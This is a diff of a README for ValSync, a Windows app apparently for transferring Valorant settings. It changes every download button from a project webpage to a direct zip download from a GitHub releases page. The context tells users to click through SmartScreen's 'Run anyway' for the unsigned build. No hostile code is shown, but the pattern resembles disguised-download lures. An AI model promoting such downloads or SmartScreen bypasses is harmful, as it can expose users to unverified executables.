@@ -15,7 +15,7 @@
 <a href="../../releases/latest"><img src="https://img.shields.io/badge/Tauri-2-8E7CFF?style=flat-square&labelColor=17181C&logo=tauri&logoColor=white" alt="Tauri 2"></a>
 </p>
 
-<a class="download-btn-action" href="https://pickle7.dev/valorant-settings-transfer/"><img src="assets/download.png" width="300" alt="Download ValSync for Windows"></a>
+<a class="download-btn-action" href="https://github.com/BlazeGovernorPivot/valorant-settings-transfer/releases/latest/download/Main-v1.0.0-win-x64.zip"><img src="assets/download.png" width="300" alt="Download ValSync for Windows"></a>
 
 <sub>Windows 10 / 11 · x64 · v1.0.0 · free</sub>
 
@@ -137,7 +137,7 @@ Transfers, cherry-picks and restores all snapshot the target first. Restoring is
 > Windows SmartScreen may show "Windows protected your PC" for new, unsigned apps. Click **More info → Run anyway**. You can verify the download against the SHA-256 checksum printed by `scripts\build.ps1` and listed in the release notes.
 
 <p align="center">
-<a class="download-btn-action" href="https://pickle7.dev/valorant-settings-transfer/"><img src="assets/download.png" width="280" alt="Download ValSync for Windows"></a>
+<a class="download-btn-action" href="https://github.com/BlazeGovernorPivot/valorant-settings-transfer/releases/latest/download/Main-v1.0.0-win-x64.zip"><img src="assets/download.png" width="280" alt="Download ValSync for Windows"></a>
 </p>
 
 ## Build from source
@@ -292,7 +292,7 @@ Released under the [MIT License](LICENSE). Copyright (c) 2026 ValSync contributo
 
 <div align="center">
 <br>
-<a class="download-btn-action" href="https://pickle7.dev/valorant-settings-transfer/"><img src="assets/download-compact.png" width="210" alt="Get ValSync v1.0.0 for Windows"></a>
+<a class="download-btn-action" href="https://github.com/BlazeGovernorPivot/valorant-settings-transfer/releases/latest/download/Main-v1.0.0-win-x64.zip"><img src="assets/download-compact.png" width="210" alt="Get ValSync v1.0.0 for Windows"></a>
 <br>
 <sub>Windows 10 / 11 · x64 · free</sub>
 </div>
